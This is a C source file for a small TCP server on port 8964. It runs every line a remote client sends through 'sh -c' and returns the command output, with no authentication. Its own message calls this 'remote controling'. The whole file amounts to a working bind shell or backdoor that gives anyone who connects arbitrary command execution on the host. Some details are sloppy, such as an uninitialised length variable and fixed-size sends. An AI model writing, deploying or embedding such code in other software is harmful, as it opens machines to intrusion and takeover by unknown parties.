#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#define PORT 8964
#define MAX_SIZE 2048

int execute(char *command, char *buf)
{
	FILE *fp;
	int count;

	if (command == NULL || buf == NULL) {
		printf("error\n");
		exit(-1);
	}

	if ((fp = popen(command, "r")) == NULL) {
		printf("creating pipe error\n");
		exit(-1);
	}

	count = 0;

	while (((buf[count] = fgetc(fp)) != EOF) && (count < 2047)) {
		count++;
	}
	buf[count] = '\0';

	pclose(fp);
	return count;
}

int main(int argc, char **argv)
{
	struct sockaddr_in server;
	struct sockaddr_in client;
	int listend;
	int connectd;
	int port;
	int sendnum;
	int recvnum;
	int opt;
	int len;
	char send_buf[MAX_SIZE];
	char recv_buf[MAX_SIZE];
	char cmd[2088];

	port = PORT;

	memset(send_buf, 0, MAX_SIZE);
	memset(recv_buf, 0, MAX_SIZE);

	opt = SO_REUSEADDR;

	if ((listend = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
		printf("create listen socket error\n");
		exit(-1);
	}
	setsockopt(listend, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

	memset(&server, 0, sizeof(server));
	server.sin_family = AF_INET;
	server.sin_addr.s_addr = htonl(INADDR_ANY);
	server.sin_port = htons(port);
	if (bind
	    (listend, (struct sockaddr *) &server,
	     sizeof(struct sockaddr)) < 0) {
		printf("bind error\n");
		exit(-1);
	}

	if (listen(listend, 5) < 0) {
		printf("listen error\n");
		exit(-1);
	}

	while (1) {
		if ((connectd =
		     accept(listend, (struct sockaddr *) &client,
			    &len)) < 0) {
			printf("create connect socket error\n");
			continue;
		}

		while (1) {
			memset(recv_buf, 0, MAX_SIZE);
			memset(send_buf, 0, MAX_SIZE);

			if ((recvnum =
			     recv(connectd, recv_buf, 2045, 0)) < 0) {
				printf("recv data error\n");
				break;
			}

			recv_buf[recvnum] = '\0';

			printf("the message is: %s\n", recv_buf);

			if (strcmp(recv_buf, "quit\n") == 0) {
				printf("quitting remote controling\n");
				break;
			}

			strcpy(cmd, "sh -c ");
			strcat(cmd, recv_buf);
			execute(cmd, send_buf);

			printf("the server message is: %s\n", send_buf);

			if (send(connectd, send_buf, 2045, 0) < 0) {
				printf("sending data error\n");
				break;
			}
		}
		close(connectd);
	}

	close(listend);
	exit(1);
}
